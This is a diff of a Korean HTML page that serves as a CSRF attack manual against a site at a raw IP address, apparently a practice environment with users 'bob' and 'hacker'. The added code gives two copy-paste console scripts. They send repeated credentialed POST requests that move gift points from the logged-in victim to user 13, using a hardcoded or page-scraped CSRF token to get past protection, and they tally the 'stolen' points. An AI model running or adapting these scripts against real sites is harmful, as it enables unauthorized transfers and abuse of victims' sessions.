@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎁 포인트 지급 완료!</title>
+    <title>🎁 토큰 인증 CSRF 공격</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -28,17 +28,8 @@
             width: 100%;
         }
         .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
-        .success { color: #00FF88; font-size: 1.8em; font-weight: bold; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
         .pulse { animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        
-        .manual-box {
-            background: rgba(0,0,0,0.3);
-            border: 2px solid #FFD700;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 20px 0;
-        }
         
         .code-box {
             background: rgba(0,0,0,0.7);
@@ -64,11 +55,6 @@
             margin: 5px;
         }
         
-        .copy-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
-        }
-        
         .step {
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
@@ -76,16 +62,24 @@
             margin: 15px 0;
             border-left: 4px solid #FFD700;
         }
+        
+        .token-box {
+            background: rgba(255, 215, 0, 0.2);
+            border: 2px solid #FFD700;
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1 class="title pulse">🎁 CSRF 공격 매뉴얼</h1>
+        <h1 class="title pulse">🔑 토큰 인증 CSRF 공격</h1>
         
-        <div class="manual-box">
-            <h2 style="color: #FFD700; margin-bottom: 15px;">⚠️ CORS 우회 방법</h2>
-            <p style="margin-bottom: 20px;">GitHub Pages에서는 CORS 때문에 막힙니다.<br>
-            <strong>직접 실행 방식</strong>을 사용하세요!</p>
+        <div class="token-box">
+            <h2 style="color: #FFD700;">🔑 CSRF 토큰 발견!</h2>
+            <p><strong>토큰:</strong> efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347</p>
+            <p style="margin-top: 10px;">이 토큰을 포함해서 공격하면 성공률이 높아집니다!</p>
         </div>
         
         <div class="step">
@@ -94,28 +88,26 @@
         </div>
         
         <div class="step">
-            <h3>⌨️ Step 2: 개발자 도구 열기</h3>
-            <p><code>F12</code> 또는 <code>Cmd+Option+I</code>로 개발자 도구를 여세요.</p>
-        </div>
-        
-        <div class="step">
-            <h3>🔥 Step 3: Console에서 실행</h3>
+            <h3>🔥 Step 2: 토큰 포함 공격 코드</h3>
             <p>아래 코드를 <strong>Console 탭</strong>에 복사해서 실행하세요:</p>
             
             <div class="code-box" id="attack-code">
-// 🎯 CSRF 공격 함수
-async function massAttack() {
-    console.log('🔥 대량 CSRF 공격 시작!');
+// 🔑 CSRF 토큰 포함 공격
+async function tokenAttack() {
+    console.log('🔑 토큰 인증 CSRF 공격 시작!');
+    
+    const csrfToken = 'efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347';
     
     const attacks = [
-        {points: 100, msg: 'attack1', type: 'coffee'},
-        {points: 150, msg: 'attack2', type: 'flower'},
-        {points: 200, msg: 'attack3', type: 'cake'},
-        {points: 250, msg: 'attack4', type: 'diamond'},
-        {points: 300, msg: 'attack5', type: 'coffee'}
+        {points: 100, msg: 'token1', type: 'coffee'},
+        {points: 150, msg: 'token2', type: 'flower'},
+        {points: 200, msg: 'token3', type: 'cake'},
+        {points: 250, msg: 'token4', type: 'diamond'},
+        {points: 300, msg: 'token5', type: 'coffee'}
     ];
     
     let total = 0;
+    let success = 0;
     
     for (let i = 0; i < attacks.length; i++) {
         const attack = attacks[i];
@@ -126,74 +118,141 @@ async function massAttack() {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.msg}`,
+                body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.msg}&csrf_token=${csrfToken}`,
                 credentials: 'include'
             });
             
-            console.log(`✅ 공격 ${i+1}: ${attack.points}P → 응답 ${response.status}`);
-            total += attack.points;
+            console.log(`🎯 공격 ${i+1}: ${attack.points}P → 상태 ${response.status}`);
+            
+            if (response.status === 200) {
+                success++;
+                total += attack.points;
+                console.log(`✅ 성공! 누적: ${total}P`);
+            }
             
         } catch (error) {
-            console.log(`❌ 공격 ${i+1} 실패:`, error.message);
+            console.log(`❌ 공격 ${i+1} 오류:`, error.message);
         }
         
         // 2초 대기
         if (i < attacks.length - 1) {
-            console.log(`⏳ ${i+1}/${attacks.length} 완료, 2초 대기...`);
+            console.log(`⏳ ${i+1}/${attacks.length} 완료, 다음 공격까지 2초...`);
             await new Promise(resolve => setTimeout(resolve, 2000));
         }
     }
     
-    console.log(`🎉 공격 완료! 총 ${total}P 전송 시도됨`);
-    console.log('🔍 hacker 프로필 확인: http://3.36.66.216/profile.php?user_id=13');
+    console.log(`🎉 토큰 공격 완료!`);
+    console.log(`📊 성공: ${success}/${attacks.length}`);
+    console.log(`💰 총 탈취: ${total}P`);
+    console.log(`🔍 확인: http://3.36.66.216/profile.php?user_id=13`);
 }
 
-// 실행
-massAttack();
+// 🚀 실행
+tokenAttack();
             </div>
             
-            <button class="copy-btn" onclick="copyCode()">📋 코드 복사</button>
+            <button class="copy-btn" onclick="copyTokenCode()">🔑 토큰 코드 복사</button>
         </div>
         
         <div class="step">
-            <h3>📊 Step 4: 결과 확인</h3>
-            <p>공격 완료 후 아래 링크들로 결과를 확인하세요:</p>
-            <button class="copy-btn" onclick="checkHacker()">🎯 hacker 확인</button>
-            <button class="copy-btn" onclick="checkBob()">👤 bob 확인</button>
+            <h3>🔄 Step 3: 동적 토큰 획득 (고급)</h3>
+            <p>토큰이 변경될 경우를 대비한 동적 토큰 획득 코드:</p>
+            
+            <div class="code-box" id="dynamic-code">
+// 🔄 동적 토큰 획득 및 공격
+async function dynamicTokenAttack() {
+    console.log('🔄 동적 토큰 CSRF 공격 시작!');
+    
+    // 현재 페이지에서 토큰 찾기
+    let token = null;
+    const tokenInput = document.querySelector('input[name="csrf_token"]');
+    if (tokenInput) {
+        token = tokenInput.value;
+        console.log(`🔑 토큰 발견: ${token}`);
+    } else {
+        console.log('⚠️ 토큰을 찾을 수 없음, 기본 토큰 사용');
+        token = 'efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347';
+    }
+    
+    const attacks = [
+        {points: 500, msg: 'dynamic1', type: 'diamond'},
+        {points: 300, msg: 'dynamic2', type: 'coffee'},
+        {points: 200, msg: 'dynamic3', type: 'cake'}
+    ];
+    
+    let totalStolen = 0;
+    
+    for (let i = 0; i < attacks.length; i++) {
+        const attack = attacks[i];
+        
+        try {
+            const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.msg}&csrf_token=${token}`,
+                credentials: 'include'
+            });
+            
+            if (response.status === 200) {
+                totalStolen += attack.points;
+                console.log(`💎 대량 공격 ${i+1} 성공: ${attack.points}P! 총: ${totalStolen}P`);
+            } else {
+                console.log(`⚠️ 공격 ${i+1} 응답: ${response.status}`);
+            }
+            
+        } catch (error) {
+            console.log(`💥 공격 ${i+1} 에러:`, error.message);
+        }
+        
+        if (i < attacks.length - 1) {
+            await new Promise(resolve => setTimeout(resolve, 3000));
+        }
+    }
+    
+    console.log(`🏆 동적 공격 완료! 총 ${totalStolen}P 탈취!`);
+}
+
+// 실행
+dynamicTokenAttack();
+            </div>
+            
+            <button class="copy-btn" onclick="copyDynamicCode()">🔄 동적 코드 복사</button>
         </div>
         
-        <div class="manual-box" style="border-color: #00FF88;">
-            <h3 style="color: #00FF88;">💰 예상 결과</h3>
-            <p><strong>hacker:</strong> +1,000P (100+150+200+250+300)</p>
-            <p><strong>bob:</strong> -1,000P</p>
-            <p><strong>성공률:</strong> 거의 100% (Same-Origin에서 실행)</p>
+        <div style="background: rgba(0, 255, 0, 0.2); border-radius: 10px; padding: 20px; margin: 20px 0;">
+            <h3 style="color: #00FF88;">✨ 토큰의 장점</h3>
+            <p>✅ CSRF 보호 우회</p>
+            <p>✅ 서버 인증 통과</p>
+            <p>✅ 높은 성공률</p>
+            <p>✅ 대량 포인트 탈취 가능</p>
         </div>
         
-        <div style="margin-top: 30px; padding: 20px; background: rgba(255, 0, 0, 0.2); border-radius: 10px;">
-            <h3 style="color: #FF6B6B;">⚠️ 중요 사항</h3>
-            <p><strong>반드시 bob으로 로그인된 상태</strong>에서 Console에서 실행하세요!</p>
-            <p>GitHub Pages가 아닌 <strong>타겟 사이트에서 직접</strong> 실행해야 합니다.</p>
-        </div>
+        <button class="copy-btn" onclick="checkResults()">📊 결과 확인</button>
     </div>
 
     <script>
-        function copyCode() {
+        function copyTokenCode() {
             const code = document.getElementById('attack-code').textContent;
             navigator.clipboard.writeText(code).then(() => {
-                alert('📋 코드가 복사되었습니다!\n\nConsole에 붙여넣기하세요.');
+                alert('🔑 토큰 포함 코드 복사 완료!\n\nConsole에서 실행하세요.');
             });
         }
         
-        function checkHacker() {
-            window.open('http://3.36.66.216/profile.php?user_id=13', 'hacker', 'width=800,height=600');
+        function copyDynamicCode() {
+            const code = document.getElementById('dynamic-code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                alert('🔄 동적 토큰 코드 복사 완료!\n\nConsole에서 실행하세요.');
+            });
         }
         
-        function checkBob() {
-            window.open('http://3.36.66.216/profile.php', 'bob', 'width=800,height=600');
+        function checkResults() {
+            window.open('http://3.36.66.216/profile.php?user_id=13', 'results', 'width=800,height=600');
         }
         
-        console.log('🎯 CSRF 공격 매뉴얼 로드됨');
-        console.log('📋 코드를 복사해서 타겟 사이트 Console에서 실행하세요!');
+        console.log('🔑 토큰 인증 CSRF 시스템 로드');
+        console.log('📋 토큰: efccf9ef2fe77e351dcd66d0c7470a0fa274c25d378b9dd3129cf3ecf8547347');
     </script>
 </body>
 </html>
